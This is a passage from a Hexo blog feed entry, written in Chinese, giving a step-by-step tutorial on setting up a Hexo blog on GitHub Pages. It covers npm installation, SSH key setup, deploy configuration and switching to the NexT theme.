title="Hexo安装"></a>Hexo安装</h3><p>hexo是我们以后用于搭建个人博客的框架，所以最好先新建一个blog文件夹用于博客的管理，且hexo框架与以后写作发布的网页都会保存在这个文件夹当中。<br>创建好之后，打开命令行，切换至创建的文件夹中：<br><img src="https://img-blog.csdnimg.cn/20210112171614641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>使用npm命令安装hexo，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>耐心等待安装完成，安装完成之后，先初始化我们的博客，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init bolg</span><br></pre></td></tr></table></figure><p>tips：这些命令必须在我们创建的文件夹中使用。</p><p>此时我们检查一下我们网站的雏形，按顺序输入以下三条命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> hello Hexo<span class="comment">//新建一篇名为“hello Hexo”的博客</span></span><br><span class="line">hexo g<span class="comment">//生成静态文件</span></span><br><span class="line">hexo s<span class="comment">//本地部署预览</span></span><br></pre></td></tr></table></figure><p>到这里我们的网站已经初步成型了，可以输入localhost:4000进行访问。</p><h3 id="Hexo的常用命令"><a href="#Hexo的常用命令" class="headerlink" title="Hexo的常用命令"></a>Hexo的常用命令</h3><h4 id="初始化命令"><a href="#初始化命令" class="headerlink" title="初始化命令"></a>初始化命令</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g<span class="comment">//安装hexo</span></span><br><span class="line">npm update hexo -g<span class="comment">//更新hexo</span></span><br><span class="line">hexo init<span class="comment">//初始化博客</span></span><br></pre></td></tr></table></figure><h4 id="命令简写"><a href="#命令简写" class="headerlink" title="命令简写"></a>命令简写</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo n <span class="string">&quot;博客名称&quot;</span> = hexo <span class="keyword">new</span> <span class="string">&quot;博客名称&quot;</span><span class="comment">//新建一篇博客</span></span><br><span class="line">hexo g = hexo generate<span class="comment">//生成</span></span><br><span class="line">hexo s = hexo server<span class="comment">//启动服务器</span></span><br><span class="line">hexo d = hexo deploy<span class="comment">//部署</span></span><br></pre></td></tr></table></figure><h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo server<span class="comment">//hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s<span class="comment">//静态模式</span></span><br><span class="line">hexo server -p <span class="number">5000</span><span class="comment">//更改端口</span></span><br><span class="line">hexo server -i <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span><span class="comment">//自定义 IP地址</span></span><br><span class="line">hexo clean<span class="comment">//清除缓存，若是网页正常情况下可以忽略这条命令</span></span><br></pre></td></tr></table></figure><h1 id="github仓库的创建"><a href="#github仓库的创建" class="headerlink" title="github仓库的创建"></a>github仓库的创建</h1><p>好了，到这里确保上方操作无误即可进行github仓库的创建(但首先你得先有个github账号哦)。<br>进入github主页，选择左上角的new：<br><img src="https://img-blog.csdnimg.cn/20210112173349599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>进入后输入仓库名称，必须要与owner下的名称一致，输入完后点击创建即可<br>我已经创建过仓库了，所以会提示<br><img src="https://img-blog.csdnimg.cn/20210112173512148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="githubSSH配置"><a href="#githubSSH配置" class="headerlink" title="githubSSH配置"></a>githubSSH配置</h1><p>搭建完仓库后就开始配置githubSSH。</p><p>进入git bash中，按顺序输入如下代码：</p><blockquote><p>git config –global user.email “<a href="mailto:&#120;&#120;&#x78;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;">&#120;&#120;&#x78;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;</a>“    //填写注册github的邮箱</p></blockquote><blockquote><p>git config –global user.name “xxxx”    //github 用户名</p></blockquote><blockquote><p>ssh-keygen    //输入完这个就一致enter就行了</p></blockquote><p>然后进入用户目录下的.ssh，打开id_rsa.pub，复制里面的内容。</p><p>进入github，新建一个SSH就可以了：</p><p><img src="https://img-blog.csdnimg.cn/20210112180408871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="sublime的安装使用"><a href="#sublime的安装使用" class="headerlink" title="sublime的安装使用"></a>sublime的安装使用</h1><p>sublime是一个好用的文本编辑器。</p><p>1、sublime下载<br>可以去官网下载：<a href="http://www.sublimetext.com/3">http://www.sublimetext.com/3</a><br>也可以云盘下载：<a href="https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw">https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw</a> 提取码：42pf </p><p>2、选择一个除C盘外的安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112203141300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后点击next，安装完成：<br><img src="https://img-blog.csdnimg.cn/20210112203231376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、将博客目录拖入sublime：<br><img src="https://img-blog.csdnimg.cn/20210112210759495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Hexo与github连接"><a href="#Hexo与github连接" class="headerlink" title="Hexo与github连接"></a>Hexo与github连接</h1><p>1、在sublime中打开_config.yml，将Deployment改为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:<span class="comment">//hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lucifer-rossweisse/lucifer-rossweisse.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>其中”repo”内填写github仓库中的SSH链接<br><img src="https://img-blog.csdnimg.cn/20210112211302998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、将”url”后改为”<a href="http://github项目名&quot;/">http://github项目名&quot;</a><br><img src="https://img-blog.csdnimg.cn/20210112211442895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、在命令行中输入下列代码，安装插件，上传博客</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">git config --global user.email <span class="string">&quot;github邮箱&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;github用户名&quot;</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>4、在浏览器中输入博客网址，也是github仓库名，即可查看(有时候需要等一会)<br><img src="https://img-blog.csdnimg.cn/20210112211855757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Hexo的主题切换"><a href="#Hexo的主题切换" class="headerlink" title="Hexo的主题切换"></a>Hexo的主题切换</h1><p>其实前面已经把重要的部分整完了，最后就换一个自己喜欢的主题就好了。</p><p>主题可以从github上搜hexo-them进行查找，比较受欢迎的是next和yilia这两个主题，以next为主，之后主题的切换都可以这么来。</p><p>1、进入博客文件夹，打开git bash，输入以下代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>安装完后可以看到博客文件夹中的themes里出现了一个next文件夹，这就是我们下载的next主题。<br><img src="https://img-blog.csdnimg.cn/20210112212458400.png"><br>2、修改主题配置文件，进入博客文件夹中的_config.yml修改主题<br><img src="https://img-blog.csdnimg.cn/20210112212618350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后先在本地测试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210112212918907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><p>4、最后直接上传发布博客就好了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>注意：hexo在5.0之后把swig给删除了，需要自己手动安装，不然安装next主题后会显示错误<br>输入下面这串代码安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure><p>然后hexo c清理缓存，hexo g &amp; s即可。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>全部的搭建步骤已经讲完了，写篇博客其实只是为了记录一下自己学习的搭建过程，如果对你有帮助的话，可以分享给你的朋友哦(￣▽￣)”</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;搭建步骤&quot;&gt;&lt;a href=&quot;#搭建步骤&quot; class=&quot;headerlink&quot; title=&quot;搭建步骤&quot;&gt;&lt;/a&gt;搭建步骤&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;环境搭建&lt;ul&gt;
&lt;li&gt;安装node.js&lt;/li&gt;
&lt;li&gt;安装git&lt;/li&gt;
&lt;li&gt;安装Hexo&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;github仓库的创建&lt;/li&gt;
&lt;li&gt;githubSSH的配置&lt;/li&gt;
&lt;li&gt;sublime的安装使用&lt;/li&gt;
&lt;li&gt;Hexo与github连接&lt;/li&gt;
&lt;li&gt;Hexo的主题切换</summary>
    
    
    
    <category term="hexo" scheme="https://rossweisse.github.io/categories/hexo/"/>
    
    
    <category term="hexo" scheme="https://rossweisse.github.io/tags/hexo/"/>
    
    <category term="next" scheme="https://rossweisse.github.io/tags/next/"/>
    
  </entry>
  
</feed>
